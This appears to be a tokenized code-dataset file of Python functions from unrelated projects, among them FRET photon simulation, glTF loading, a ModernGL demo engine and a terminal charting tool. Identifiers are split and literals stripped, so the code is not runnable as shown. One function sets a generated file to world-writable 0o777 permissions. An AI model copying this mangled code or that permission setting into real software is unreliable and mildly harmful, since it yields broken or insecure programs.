def dn ( self , x , M change = 12 ) : y = signal . sosfilt ( self . sos , x ) y = ssd . downsample ( y , M change ) return y
def zplane ( self , auto scale = True , size = 2 , detect mult = True , tol = 0.001 ) : iir d . sos zplane ( self . sos , auto scale , size , tol )
def is already running ( self ) : redis key = self . CELERY LOCK . format ( task id = self . task identifier ) return self . celery self . backend . client . exists ( redis key )
def reset lock ( self ) : redis key = self . CELERY LOCK . format ( task id = self . task identifier ) self . celery self . backend . client . delete ( redis key )
def is already running ( self ) : date done = ( self . restore group ( self . task identifier ) or dict ( ) ) . get ( 'date done' ) if not date done : return False difference = datetime . utcnow ( ) - date done return difference < timedelta ( seconds = self . timeout )
def reduce chunk ( func , array ) : res = [ ] for slice in iter chunk slice ( array . shape [ - 1 ] , array . chunkshape [ - 1 ] ) : res . append ( func ( array [ ... , slice ] ) ) return func ( res )
def merge DA ph times ( ph times d , ph times a ) : ph times = np . hstack ( [ ph times d , ph times a ] ) a em = np . hstack ( [ np . zeros ( ph times d . size , dtype = np . bool ) , np . ones ( ph times a . size , dtype = np . bool ) ] ) index sort = ph times . argsort ( ) return ph times [ index sort ] , a em [ index sort ]
def load PSF Lab file ( fname ) : if os . path . exists ( fname ) or os . path . exists ( fname + '.mat' ) : return loadmat ( fname ) [ 'data' ] else : raise IO Error ( "Can't find PSF file '%s'" % fname )
def hash ( self ) : hash list = [ ] for key , value in sorted ( self . dict . items ( ) ) : if not callable ( value ) : if isinstance ( value , np . ndarray ) : hash list . append ( value . tostring ( ) ) else : hash list . append ( str ( value ) ) return hashlib . md5 ( repr ( hash list ) . encode ( ) ) . hexdigest ( )
def git path valid ( git path = None ) : if git path is None and GIT PATH is None : return False if git path is None : git path = GIT PATH try : call ( [ git path , '--version' ] ) return True except OS Error : return False
def get git version ( git path = None ) : if git path is None : git path = GIT PATH git version = check output ( [ git path , "--version" ] ) . split ( ) [ 2 ] return git version
def check clean status ( git path = None ) : output = get status ( git path ) is unmodified = ( len ( output . strip ( ) ) == 0 ) return is unmodified
def get last commit line ( git path = None ) : if git path is None : git path = GIT PATH output = check output ( [ git path , "log" , "--pretty=format:'%ad %h %s'" , "--date=short" , "-n1" ] ) return output . strip ( ) [ 1 : - 1 ]
def get last commit ( git path = None ) : if git path is None : git path = GIT PATH line = get last commit line ( git path ) revision id = line . split ( ) [ 1 ] return revision id
def print summary ( string = 'Repository' , git path = None ) : if git path is None : git path = GIT PATH # If git is available, check fretbursts version if not git path valid ( ) : print ( '\n%s revision unknown (git not found).' % string ) else : last commit = get last commit line ( ) print ( '\n{} revision:\n {}\n' . format ( string , last commit ) ) if not check clean status ( ) : print ( '\n WARNING -> Uncommitted changes:' ) print ( get status ( ) )
def get bromo fnames da ( d em k Hz , d bg k Hz , a em k Hz , a bg k Hz , ID = '1+2+3+4+5+6' , t tot = '480' , num p = '30' , p M = '64' , t step = 0.5e-6 , D = 1.2e-11 , dir = '' ) : clk p = t step / 32. # with t step=0.5us -> 156.25 ns E sim = 1. * a em k Hz / ( a em k Hz + d em k Hz ) FRET val = 100. * E sim print ( "Simulated FRET value: %.1f%%" % FRET val ) d em k Hz str = "%04d" % d em k Hz a em k Hz str = "%04d" % a em k Hz d bg k Hz str = "%04.1f" % d bg k Hz a bg k Hz str = "%04.1f" % a bg k Hz print ( "D: EM %s BG %s " % ( d em k Hz str , d bg k Hz str ) ) print ( "A: EM %s BG %s " % ( a em k Hz str , a bg k Hz str ) ) fname d = ( 'ph times {t tot}s D{D} {np}P {p M}p M ' 'step{ts us}us ID{ID} EM{em}k Hz BG{bg}k Hz.npy' ) . format ( em = d em k Hz str , bg = d bg k Hz str , t tot = t tot , p M = p M , np = num p , ID = ID , ts us = t step * 1e6 , D = D ) fname a = ( 'ph times {t tot}s D{D} {np}P {p M}p M ' 'step{ts us}us ID{ID} EM{em}k Hz BG{bg}k Hz.npy' ) . format ( em = a em k Hz str , bg = a bg k Hz str , t tot = t tot , p M = p M , np = num p , ID = ID , ts us = t step * 1e6 , D = D ) print ( fname d ) print ( fname a ) name = ( 'Bro Sim E{:.1f} d BG{:.1f}k a BG{:.1f}k ' 'd EM{:.0f}k' ) . format ( FRET val , d bg k Hz , a bg k Hz , d em k Hz ) return dir + fname d , dir + fname a , name , clk p , E sim
def volume ( self ) : return ( self . x2 - self . x1 ) * ( self . y2 - self . y1 ) * ( self . z2 - self . z1 )
def generate ( num particles , D , box , rs ) : X0 = rs . rand ( num particles ) * ( box . x2 - box . x1 ) + box . x1 Y0 = rs . rand ( num particles ) * ( box . y2 - box . y1 ) + box . y1 Z0 = rs . rand ( num particles ) * ( box . z2 - box . z1 ) + box . z1 return [ Particle ( D = D , x0 = x0 , y0 = y0 , z0 = z0 ) for x0 , y0 , z0 in zip ( X0 , Y0 , Z0 ) ]
def add ( self , num particles , D ) : self . plist += self . generate ( num particles , D , box = self . box , rs = self . rs )
def datafile from hash ( hash , prefix , path ) : pattern = '%s %s*.h*' % ( prefix , hash ) datafiles = list ( path . glob ( pattern ) ) if len ( datafiles ) == 0 : raise No Match Error ( 'No matches for "%s"' % pattern ) if len ( datafiles ) > 1 : raise Multiple Matches Error ( 'More than 1 match for "%s"' % pattern ) return datafiles [ 0 ]
def compact name ( self , hashsize = 6 ) : # this can be made more robust for ID > 9 (double digit) s = self . compact name core ( hashsize , t max = True ) s += " ID%d-%d" % ( self . ID , self . EID ) return s
def print sizes ( self ) : float size = 4 MB = 1024 * 1024 size = self . n samples * float size em size = size * self . num particles / MB pos size = 3 * size * self . num particles / MB print ( "  Number of particles:" , self . num particles ) print ( "  Number of time steps:" , self . n samples ) print ( "  Emission array - 1 particle (float32): %.1f MB" % ( size / MB ) ) print ( "  Emission array (float32): %.1f MB" % em size ) print ( "  Position array (float32): %.1f MB " % pos size )
def em rates from E DA mix ( em rates tot , E values ) : em rates d , em rates a = [ ] , [ ] for em rate tot , E value in zip ( em rates tot , E values ) : em rate di , em rate ai = em rates from E DA ( em rate tot , E value ) em rates d . append ( em rate di ) em rates a . append ( em rate ai ) return em rates d , em rates a
def populations diff coeff ( particles , populations ) : D counts = particles . diffusion coeff counts if len ( D counts ) == 1 : pop sizes = [ pop . stop - pop . start for pop in populations ] assert D counts [ 0 ] [ 1 ] >= sum ( pop sizes ) D counts = [ ( D counts [ 0 ] [ 0 ] , ps ) for ps in pop sizes ] D list = [ ] D pop start = 0 # start index of diffusion-based populations for pop , ( D , counts ) in zip ( populations , D counts ) : D list . append ( D ) assert pop . start >= D pop start assert pop . stop <= D pop start + counts D pop start += counts return D list
def populations slices ( particles , num pop list ) : slices = [ ] i prev = 0 for num pop in num pop list : slices . append ( slice ( i prev , i prev + num pop ) ) i prev += num pop return slices
def calc hash da ( self , rs ) : self . hash d = hash ( rs . get state ( ) ) [ : 6 ] self . hash a = self . hash d
def run ( self , rs , overwrite = True , skip existing = False , path = None , chunksize = None ) : if path is None : path = str ( self . S . store . filepath . parent ) kwargs = dict ( rs = rs , overwrite = overwrite , path = path , timeslice = self . timeslice , skip existing = skip existing ) if chunksize is not None : kwargs [ 'chunksize' ] = chunksize header = ' - Mixture Simulation:' # Donor timestamps hash is from the input Random State self . hash d = hash ( rs . get state ( ) ) [ : 6 ] # needed by merge da() print ( '%s Donor timestamps -    %s' % ( header , ctime ( ) ) , flush = True ) self . S . simulate timestamps mix ( populations = self . populations , max rates = self . em rates d , bg rate = self . bg rate d , * * kwargs ) # Acceptor timestamps hash is from 'last random state' attribute # of the donor timestamps. This allows deterministic generation of # donor + acceptor timestamps given the input random state. ts d , = self . S . get timestamps part ( self . name timestamps d ) rs . set state ( ts d . attrs [ 'last random state' ] ) self . hash a = hash ( rs . get state ( ) ) [ : 6 ] # needed by merge da() print ( '\n%s Acceptor timestamps - %s' % ( header , ctime ( ) ) , flush = True ) self . S . simulate timestamps mix ( populations = self . populations , max rates = self . em rates a , bg rate = self . bg rate a , * * kwargs ) print ( '\n%s Completed. %s' % ( header , ctime ( ) ) , flush = True )
def run da ( self , rs , overwrite = True , skip existing = False , path = None , chunksize = None ) : if path is None : path = str ( self . S . store . filepath . parent ) kwargs = dict ( rs = rs , overwrite = overwrite , path = path , timeslice = self . timeslice , skip existing = skip existing ) if chunksize is not None : kwargs [ 'chunksize' ] = chunksize header = ' - Mixture Simulation:' # Donor timestamps hash is from the input Random State self . calc hash da ( rs ) print ( '%s Donor + Acceptor timestamps - %s' % ( header , ctime ( ) ) , flush = True ) self . S . simulate timestamps mix da ( max rates d = self . em rates d , max rates a = self . em rates a , populations = self . populations , bg rate d = self . bg rate d , bg rate a = self . bg rate a , * * kwargs ) print ( '\n%s Completed. %s' % ( header , ctime ( ) ) , flush = True )
def merge da ( self ) : print ( ' - Merging D and A timestamps' , flush = True ) ts d , ts par d = self . S . get timestamps part ( self . name timestamps d ) ts a , ts par a = self . S . get timestamps part ( self . name timestamps a ) ts , a ch , part = merge da ( ts d , ts par d , ts a , ts par a ) assert a ch . sum ( ) == ts a . shape [ 0 ] assert ( ~ a ch ) . sum ( ) == ts d . shape [ 0 ] assert a ch . size == ts a . shape [ 0 ] + ts d . shape [ 0 ] self . ts , self . a ch , self . part = ts , a ch , part self . clk p = ts d . attrs [ 'clk p' ]
def save photon hdf5 ( self , identity = None , overwrite = True , path = None ) : filepath = self . filepath if path is not None : filepath = Path ( path , filepath . name ) self . merge da ( ) data = self . make photon hdf5 ( identity = identity ) phc . hdf5 . save photon hdf5 ( data , h5 fname = str ( filepath ) , overwrite = overwrite )
def load gltf ( self ) : with open ( self . path ) as fd : self . meta = GLTF Meta ( self . path , json . load ( fd ) )
def load glb ( self ) : with open ( self . path , 'rb' ) as fd : # Check header magic = fd . read ( 4 ) if magic != GLTF MAGIC HEADER : raise Value Error ( "{} has incorrect header {} != {}" . format ( self . path , magic , GLTF MAGIC HEADER ) ) version = struct . unpack ( '<I' , fd . read ( 4 ) ) [ 0 ] if version != 2 : raise Value Error ( "{} has unsupported version {}" . format ( self . path , version ) ) # Total file size including headers = struct . unpack ( '<I' , fd . read ( 4 ) ) [ 0 ] # noqa # Chunk 0 - json chunk 0 length = struct . unpack ( '<I' , fd . read ( 4 ) ) [ 0 ] chunk 0 type = fd . read ( 4 ) if chunk 0 type != b'JSON' : raise Value Error ( "Expected JSON chunk, not {} in file {}" . format ( chunk 0 type , self . path ) ) json meta = fd . read ( chunk 0 length ) . decode ( ) # chunk 1 - binary buffer chunk 1 length = struct . unpack ( '<I' , fd . read ( 4 ) ) [ 0 ] chunk 1 type = fd . read ( 4 ) if chunk 1 type != b'BIN\x00' : raise Value Error ( "Expected BIN chunk, not {} in file {}" . format ( chunk 1 type , self . path ) ) self . meta = GLTF Meta ( self . path , json . loads ( json meta ) , binary buffer = fd . read ( chunk 1 length ) )
def buffers exist ( self ) : for buff in self . buffers : if not buff . is separate file : continue path = self . path . parent / buff . uri if not os . path . exists ( path ) : raise File Not Found Error ( "Buffer {} referenced in {} not found" . format ( path , self . path ) )
def prepare attrib mapping ( self , primitive ) : buffer info = [ ] for name , accessor in primitive . attributes . items ( ) : info = VBO Info ( * accessor . info ( ) ) info . attributes . append ( ( name , info . components ) ) if buffer info and buffer info [ - 1 ] . buffer view == info . buffer view : if buffer info [ - 1 ] . interleaves ( info ) : buffer info [ - 1 ] . merge ( info ) continue buffer info . append ( info ) return buffer info
def get bbox ( self , primitive ) : accessor = primitive . attributes . get ( 'POSITION' ) return accessor . min , accessor . max
def interleaves ( self , info ) : return info . byte offset == self . component type . size * self . components
def update yaw and pitch ( self ) : front = Vector3 ( [ 0.0 , 0.0 , 0.0 ] ) front . x = cos ( radians ( self . yaw ) ) * cos ( radians ( self . pitch ) ) front . y = sin ( radians ( self . pitch ) ) front . z = sin ( radians ( self . yaw ) ) * cos ( radians ( self . pitch ) ) self . dir = vector . normalise ( front ) self . right = vector . normalise ( vector3 . cross ( self . dir , self . up ) ) self . up = vector . normalise ( vector3 . cross ( self . right , self . dir ) )
def translate string ( self , data , length ) : for index , char in enumerate ( data ) : if index == length : break yield self . meta . characters - 1 - self . ct [ char ]
def draw bbox ( self , projection matrix = None , camera matrix = None , all = True ) : projection matrix = projection matrix . astype ( 'f4' ) . tobytes ( ) camera matrix = camera matrix . astype ( 'f4' ) . tobytes ( ) # Scene bounding box self . bbox program [ "m proj" ] . write ( projection matrix ) self . bbox program [ "m view" ] . write ( self . view matrix . astype ( 'f4' ) . tobytes ( ) ) self . bbox program [ "m cam" ] . write ( camera matrix ) self . bbox program [ "bb min" ] . write ( self . bbox min . astype ( 'f4' ) . tobytes ( ) ) self . bbox program [ "bb max" ] . write ( self . bbox max . astype ( 'f4' ) . tobytes ( ) ) self . bbox program [ "color" ] . value = ( 1.0 , 0.0 , 0.0 ) self . bbox vao . render ( self . bbox program ) if not all : return # Draw bounding box for children for node in self . root nodes : node . draw bbox ( projection matrix , camera matrix , self . bbox program , self . bbox vao )
def apply mesh programs ( self , mesh programs = None ) : if not mesh programs : mesh programs = [ Color Program ( ) , Texture Program ( ) , Fallback Program ( ) ] for mesh in self . meshes : for mp in mesh programs : instance = mp . apply ( mesh ) if instance is not None : if isinstance ( instance , Mesh Program ) : mesh . mesh program = mp break else : raise Value Error ( "apply() must return a Mesh Program instance, not {}" . format ( type ( instance ) ) ) if not mesh . mesh program : print ( "WARING: No mesh program applied to '{}'" . format ( mesh . name ) )
def get time ( self ) -> float : if self . paused : return self . pause time return mixer . music . get pos ( ) / 1000.0
def render lights debug ( self , camera matrix , projection ) : self . ctx . enable ( moderngl . BLEND ) self . ctx . blend func = moderngl . SRC ALPHA , moderngl . ONE MINUS SRC ALPHA for light in self . point lights : m mv = matrix44 . multiply ( light . matrix , camera matrix ) light size = light . radius self . debug shader [ "m proj" ] . write ( projection . tobytes ( ) ) self . debug shader [ "m mv" ] . write ( m mv . astype ( 'f4' ) . tobytes ( ) ) self . debug shader [ "size" ] . value = light size self . unit cube . render ( self . debug shader , mode = moderngl . LINE STRIP ) self . ctx . disable ( moderngl . BLEND )
def combine ( self ) : self . gbuffer . color attachments [ 0 ] . use ( location = 0 ) self . combine shader [ "diffuse buffer" ] . value = 0 self . lightbuffer . color attachments [ 0 ] . use ( location = 1 ) self . combine shader [ "light buffer" ] . value = 1 self . quad . render ( self . combine shader )
def load shader ( self , shader type : str , path : str ) : if path : resolved path = self . find program ( path ) if not resolved path : raise Value Error ( "Cannot find {} shader '{}'" . format ( shader type , path ) ) print ( "Loading:" , path ) with open ( resolved path , 'r' ) as fd : return fd . read ( )
def load ( self ) : self . open image ( ) width , height , depth = self . image . size [ 0 ] , self . image . size [ 1 ] // self . layers , self . layers components , data = image data ( self . image ) texture = self . ctx . texture array ( ( width , height , depth ) , components , data , ) texture . extra = { 'meta' : self . meta } if self . meta . mipmap : texture . build mipmaps ( ) self . close image ( ) return texture
def available templates ( value ) : templates = list templates ( ) if value not in templates : raise Argument Type Error ( "Effect template '{}' does not exist.\n Available templates: {} " . format ( value , ", " . join ( templates ) ) ) return value
def root path ( ) : module dir = os . path . dirname ( globals ( ) [ ' file ' ] ) return os . path . dirname ( os . path . dirname ( module dir ) )
def load ( self ) : self . meta . resolved path = self . find data ( self . meta . path ) if not self . meta . resolved path : raise Improperly Configured ( "Data file '{}' not found" . format ( self . meta . path ) ) print ( "Loading:" , self . meta . path ) with open ( self . meta . resolved path , 'r' ) as fd : return fd . read ( )
def calc global bbox ( self , view matrix , bbox min , bbox max ) : if self . matrix is not None : view matrix = matrix44 . multiply ( self . matrix , view matrix ) if self . mesh : bbox min , bbox max = self . mesh . calc global bbox ( view matrix , bbox min , bbox max ) for child in self . children : bbox min , bbox max = child . calc global bbox ( view matrix , bbox min , bbox max ) return bbox min , bbox max
def swap buffers ( self ) : self . frames += 1 glfw . swap buffers ( self . window ) self . poll events ( )
def resize ( self , width , height ) : self . width = width self . height = height self . buffer width , self . buffer height = glfw . get framebuffer size ( self . window ) self . set default viewport ( )
def check glfw version ( self ) : print ( "glfw version: {} (python wrapper version {})" . format ( glfw . get version ( ) , glfw . version ) ) if glfw . get version ( ) < self . min glfw version : raise Value Error ( "Please update glfw binaries to version {} or later" . format ( self . min glfw version ) )
def translate buffer format ( vertex format ) : buffer format = [ ] attributes = [ ] mesh attributes = [ ] if "T2F" in vertex format : buffer format . append ( "2f" ) attributes . append ( "in uv" ) mesh attributes . append ( ( "TEXCOORD 0" , "in uv" , 2 ) ) if "C3F" in vertex format : buffer format . append ( "3f" ) attributes . append ( "in color" ) mesh attributes . append ( ( "NORMAL" , "in color" , 3 ) ) if "N3F" in vertex format : buffer format . append ( "3f" ) attributes . append ( "in normal" ) mesh attributes . append ( ( "NORMAL" , "in normal" , 3 ) ) buffer format . append ( "3f" ) attributes . append ( "in position" ) mesh attributes . append ( ( "POSITION" , "in position" , 3 ) ) return " " . join ( buffer format ) , attributes , mesh attributes
def resolve loader ( self , meta : Scene Description ) : for loader cls in self . loaders : if loader cls . supports file ( meta ) : meta . loader cls = loader cls break else : raise Improperly Configured ( "Scene {} has no loader class registered. Check settings.SCENE LOADERS" . format ( meta . path ) )
def on resize ( self , width , height ) : self . width , self . height = width , height self . buffer width , self . buffer height = width , height self . resize ( width , height )
def swap buffers ( self ) : if not self . window . context : return self . frames += 1 self . window . flip ( ) self . window . dispatch events ( )
def load pool ( self ) : for meta in self . resources : resource = self . load ( meta ) yield meta , resource self . resources = [ ]
def resize ( self , width , height ) : if not self . fbo : return # pyqt reports sizes in actual buffer size self . width = width // self . widget . device Pixel Ratio ( ) self . height = height // self . widget . device Pixel Ratio ( ) self . buffer width = width self . buffer height = height super ( ) . resize ( width , height )
def init texture2d draw ( self ) : if not Texture Helper . quad : Texture Helper . quad = geometry . quad fs ( ) Texture Helper . texture2d shader = context . ctx ( ) . program ( vertex shader = , fragment shader = ) Texture Helper . texture2d sampler = self . ctx . sampler ( filter = ( moderngl . LINEAR , moderngl . LINEAR ) , )
def init depth texture draw ( self ) : from demosys import geometry if not Texture Helper . quad : Texture Helper . quad = geometry . quad fs ( ) Texture Helper . depth shader = context . ctx ( ) . program ( vertex shader = , fragment shader = ) Texture Helper . depth sampler = self . ctx . sampler ( filter = ( moderngl . LINEAR , moderngl . LINEAR ) , compare func = '' , )
def clear ( self ) : self . ctx . fbo . clear ( red = self . clear color [ 0 ] , green = self . clear color [ 1 ] , blue = self . clear color [ 2 ] , alpha = self . clear color [ 3 ] , depth = self . clear depth , )
def supports file ( cls , meta ) : path = Path ( meta . path ) for ext in cls . file extensions : if path . suffixes [ : len ( ext ) ] == ext : return True return False
def add program dir ( self , directory ) : dirs = list ( self . PROGRAM DIRS ) dirs . append ( directory ) self . PROGRAM DIRS = dirs
def add texture dir ( self , directory ) : dirs = list ( self . TEXTURE DIRS ) dirs . append ( directory ) self . TEXTURE DIRS = dirs
def add data dir ( self , directory ) : dirs = list ( self . DATA DIRS ) dirs . append ( directory ) self . DATA DIRS = dirs
def content ( self , attributes : List [ str ] ) : formats = [ ] attrs = [ ] for attrib format , attrib in zip ( self . attrib formats , self . attributes ) : if attrib not in attributes : formats . append ( attrib format . pad str ( ) ) continue formats . append ( attrib format . format ) attrs . append ( attrib ) attributes . remove ( attrib ) if not attrs : return None return ( self . buffer , "{}{}" . format ( " " . join ( formats ) , '/i' if self . per instance else '' ) , * attrs )
def get dirs ( self ) -> List [ str ] : for package in self . packages : yield os . path . join ( package . path , 'resources' )
def runnable effects ( self ) -> List [ Type [ Effect ] ] : return [ cls for cls in self . effect classes if cls . runnable ]
def load package ( self ) : try : self . package = importlib . import module ( self . name ) except Module Not Found Error : raise Module Not Found Error ( "Effect package '{}' not found." . format ( self . name ) )
def load effects classes ( self ) : self . effect classes = [ ] for , cls in inspect . getmembers ( self . effect module ) : if inspect . isclass ( cls ) : if cls == Effect : continue if issubclass ( cls , Effect ) : self . effect classes . append ( cls ) self . effect class map [ cls . name ] = cls cls . name = "{}.{}" . format ( self . effect module name , cls . name )
def load resource module ( self ) : # Attempt to load the dependencies module try : name = '{}.{}' . format ( self . name , 'dependencies' ) self . dependencies module = importlib . import module ( name ) except Module Not Found Error as err : raise Effect Error ( ( "Effect package '{}' has no 'dependencies' module or the module has errors. " "Forwarded error from importlib: {}" ) . format ( self . name , err ) ) # Fetch the resource descriptions try : self . resources = getattr ( self . dependencies module , 'resources' ) except Attribute Error : raise Effect Error ( "Effect dependencies module '{}' has no 'resources' attribute" . format ( name ) ) if not isinstance ( self . resources , list ) : raise Effect Error ( "Effect dependencies module '{}': 'resources' is of type {} instead of a list" . format ( name , type ( self . resources ) ) ) # Fetch the effect class list try : self . effect packages = getattr ( self . dependencies module , 'effect packages' ) except Attribute Error : raise Effect Error ( "Effect dependencies module '{}' has 'effect packages' attribute" . format ( name ) ) if not isinstance ( self . effect packages , list ) : raise Effect Error ( "Effect dependencies module '{}': 'effect packages' is of type {} instead of a list" . format ( name , type ( self . effects ) ) )
def load ( self ) : self . open image ( ) components , data = image data ( self . image ) texture = self . ctx . texture ( self . image . size , components , data , ) texture . extra = { 'meta' : self . meta } if self . meta . mipmap : texture . build mipmaps ( ) self . close image ( ) return texture
def from single ( cls , meta : Program Description , source : str ) : instance = cls ( meta ) instance . vertex source = Shader Source ( VERTEX SHADER , meta . path or meta . vertex shader , source ) if GEOMETRY SHADER in source : instance . geometry source = Shader Source ( GEOMETRY SHADER , meta . path or meta . geometry shader , source , ) if FRAGMENT SHADER in source : instance . fragment source = Shader Source ( FRAGMENT SHADER , meta . path or meta . fragment shader , source , ) if TESS CONTROL SHADER in source : instance . tess control source = Shader Source ( TESS CONTROL SHADER , meta . path or meta . tess control shader , source , ) if TESS EVALUATION SHADER in source : instance . tess evaluation source = Shader Source ( TESS EVALUATION SHADER , meta . path or meta . tess evaluation shader , source , ) return instance
def from separate ( cls , meta : Program Description , vertex source , geometry source = None , fragment source = None , tess control source = None , tess evaluation source = None ) : instance = cls ( meta ) instance . vertex source = Shader Source ( VERTEX SHADER , meta . path or meta . vertex shader , vertex source , ) if geometry source : instance . geometry source = Shader Source ( GEOMETRY SHADER , meta . path or meta . geometry shader , geometry source , ) if fragment source : instance . fragment source = Shader Source ( FRAGMENT SHADER , meta . path or meta . fragment shader , fragment source , ) if tess control source : instance . tess control source = Shader Source ( TESS CONTROL SHADER , meta . path or meta . tess control shader , tess control source , ) if tess evaluation source : instance . tess evaluation source = Shader Source ( TESS EVALUATION SHADER , meta . path or meta . tess control shader , tess evaluation source , ) return instance
def print ( self ) : print ( "---[ START {} ]---" . format ( self . name ) ) for i , line in enumerate ( self . lines ) : print ( "{}: {}" . format ( str ( i ) . zfill ( 3 ) , line ) ) print ( "---[ END {} ]---" . format ( self . name ) )
def load ( self ) : self . create effect classes ( ) self . add resource descriptions to pools ( self . create external resources ( ) ) self . add resource descriptions to pools ( self . create resources ( ) ) for meta , resource in resources . textures . load pool ( ) : self . textures [ meta . label ] = resource for meta , resource in resources . programs . load pool ( ) : self . programs [ meta . label ] = resource for meta , resource in resources . scenes . load pool ( ) : self . scenes [ meta . label ] = resource for meta , resource in resources . data . load pool ( ) : self . data [ meta . label ] = resource self . create effect instances ( ) self . post load ( )
def reload programs ( self ) : print ( "Reloading programs:" ) for name , program in self . programs . items ( ) : if getattr ( program , 'program' , None ) : print ( " - {}" . format ( program . meta . label ) ) program . program = resources . programs . load ( program . meta )
def image data ( image ) : data = image . tobytes ( ) components = len ( data ) // ( image . size [ 0 ] * image . size [ 1 ] ) return components , data
def find last of ( self , path , finders ) : found path = None for finder in finders : result = finder . find ( path ) if result : found path = result return found path
def initial sanity check ( self ) : self . try import ( self . project name ) self . validate name ( self . project name ) if os . path . exists ( self . project name ) : print ( "Directory {} already exist. Aborting." . format ( self . project name ) ) return False if os . path . exists ( 'manage.py' ) : print ( "A manage.py file already exist in the current directory. Aborting." ) return False return True
def create entrypoint ( self ) : with open ( os . path . join ( self . template dir , 'manage.py' ) , 'r' ) as fd : data = fd . read ( ) . format ( project name = self . project name ) with open ( 'manage.py' , 'w' ) as fd : fd . write ( data ) os . chmod ( 'manage.py' , 0o777 )
def get template dir ( self ) : directory = os . path . dirname ( os . path . abspath ( file ) ) directory = os . path . dirname ( os . path . dirname ( directory ) ) directory = os . path . join ( directory , 'project template' ) return directory
def usage function ( parser ) : parser . print usage ( ) print ( '' ) print ( 'available functions:' ) for function in sorted ( FUNCTION ) : doc = FUNCTION [ function ] . doc . strip ( ) . splitlines ( ) [ 0 ] print ( '    %-12s %s' % ( function + ':' , doc ) ) return 0
def usage palette ( parser ) : parser . print usage ( ) print ( '' ) print ( 'available palettes:' ) for palette in sorted ( PALETTE ) : print ( '    %-12s' % ( palette , ) ) return 0
def run ( ) : import argparse parser = argparse . Argument Parser ( description = ( 'Text mode diagrams using UTF-8 characters and fancy colors.' ) , epilog = , ) group = parser . add argument group ( 'optional drawing mode' ) group . add argument ( '-G' , '--graph' , dest = 'mode' , action = 'store const' , const = 'g' , help = 'axis drawing mode (default)' , ) group . add argument ( '-H' , '--horizontal-bars' , dest = 'mode' , action = 'store const' , const = 'h' , help = 'horizontal drawing mode' , ) group . add argument ( '-V' , '--vertical-bars' , dest = 'mode' , action = 'store const' , const = 'v' , help = 'vertical drawing mode' , ) group = parser . add argument group ( 'optional drawing arguments' ) group . add argument ( '-a' , '--axis' , dest = 'axis' , action = 'store const' , const = True , default = True , help = 'draw axis (default: yes)' , ) group . add argument ( '-A' , '--no-axis' , dest = 'axis' , action = 'store const' , const = False , help = "don't draw axis" , ) group . add argument ( '-c' , '--color' , dest = 'color' , action = 'store const' , const = True , default = True , help = 'use colors (default: yes)' , ) group . add argument ( '-C' , '--no-color' , dest = 'color' , action = 'store const' , const = False , help = "don't use colors" , ) group . add argument ( '-l' , '--legend' , dest = 'legend' , action = 'store const' , const = True , default = True , help = 'draw y-axis legend (default: yes)' , ) group . add argument ( '-L' , '--no-legend' , dest = 'legend' , action = 'store const' , const = False , help = "don't draw y-axis legend" , ) group . add argument ( '-f' , '--function' , default = None , metavar = 'function' , help = 'curve manipulation function, use "help" for a list' , ) group . add argument ( '-p' , '--palette' , default = 'default' , metavar = 'palette' , help = 'palette name, use "help" for a list' , ) group . add argument ( '-x' , '--width' , default = 0 , type = int , metavar = 'characters' , help = 'drawing width (default: auto)' , ) group . add argument ( '-y' , '--height' , default = 0 , type = int , metavar = 'characters' , help = 'drawing height (default: auto)' , ) group . add argument ( '-r' , '--reverse' , default = False , action = 'store true' , help = 'reverse draw graph' , ) group . add argument ( '--sort-by-column' , default = 0 , type = int , metavar = 'index' , help = 'sort input data based on given column' , ) group = parser . add argument group ( 'optional input and output arguments' ) group . add argument ( '-b' , '--batch' , default = False , action = 'store true' , help = 'batch mode (default: no)' , ) group . add argument ( '-k' , '--keys' , default = False , action = 'store true' , help = 'input are key-value pairs (default: no) (1)' , ) group . add argument ( '-s' , '--sleep' , default = 0 , type = float , help = 'batch poll sleep time (default: none)' , ) group . add argument ( '-i' , '--input' , default = '-' , metavar = 'file' , help = 'input file (default: stdin)' , ) group . add argument ( '-o' , '--output' , default = '-' , metavar = 'file' , help = 'output file (default: stdout)' , ) group . add argument ( '-e' , '--encoding' , dest = 'encoding' , default = '' , help = 'output encoding (default: auto)' , ) option = parser . parse args ( ) if option . function == 'help' : return usage function ( parser ) if option . palette == 'help' : return usage palette ( parser ) option . mode = option . mode or 'g' option . size = Point ( ( option . width , option . height ) ) if option . input in [ '-' , 'stdin' ] : istream = sys . stdin else : istream = open ( option . input , 'r' ) if option . output in [ '-' , 'stdout' ] : try : ostream = sys . stdout . buffer except Attribute Error : ostream = sys . stdout else : ostream = open ( option . output , 'wb' ) option . encoding = option . encoding or Terminal ( ) . encoding if option . mode == 'g' : engine = Axis Graph ( option . size , option ) elif option . mode == 'h' : engine = Horizontal Bar Graph ( option . size , option ) elif option . mode == 'v' : engine = Vertical Bar Graph ( option . size , option ) else : parser . error ( 'invalid mode' ) return 1 engine . consume ( istream , ostream , batch = option . batch )
def size ( self ) : for fd in range ( 3 ) : cr = self . ioctl GWINSZ ( fd ) if cr : break if not cr : try : fd = os . open ( os . ctermid ( ) , os . O RDONLY ) cr = self . ioctl GWINSZ ( fd ) os . close ( fd ) except Exception : pass if not cr : env = os . environ cr = ( env . get ( 'LINES' , 25 ) , env . get ( 'COLUMNS' , 80 ) ) return int ( cr [ 1 ] ) , int ( cr [ 0 ] )
def csi ( self , capname , * args ) : value = curses . tigetstr ( capname ) if value is None : return b'' else : return curses . tparm ( value , * args )
def csi wrap ( self , value , capname , * args ) : if isinstance ( value , str ) : value = value . encode ( 'utf-8' ) return b'' . join ( [ self . csi ( capname , * args ) , value , self . csi ( 'sgr0' ) , ] )
def consume ( self , istream , ostream , batch = False ) : datapoints = [ ] # List of 2-tuples if batch : sleep = max ( 0.01 , self . option . sleep ) fd = istream . fileno ( ) while True : try : if select . select ( [ fd ] , [ ] , [ ] , sleep ) : try : line = istream . readline ( ) if line == '' : break datapoints . append ( self . consume line ( line ) ) except Value Error : continue if self . option . sort by column : datapoints = sorted ( datapoints , key = itemgetter ( self . option . sort by column - 1 ) ) if len ( datapoints ) > 1 : datapoints = datapoints [ - self . maximum points : ] self . update ( [ dp [ 0 ] for dp in datapoints ] , [ dp [ 1 ] for dp in datapoints ] ) self . render ( ostream ) time . sleep ( sleep ) except Keyboard Interrupt : break else : for line in istream : try : datapoints . append ( self . consume line ( line ) ) except Value Error : pass if self . option . sort by column : datapoints = sorted ( datapoints , key = itemgetter ( self . option . sort by column - 1 ) ) self . update ( [ dp [ 0 ] for dp in datapoints ] , [ dp [ 1 ] for dp in datapoints ] ) self . render ( ostream )
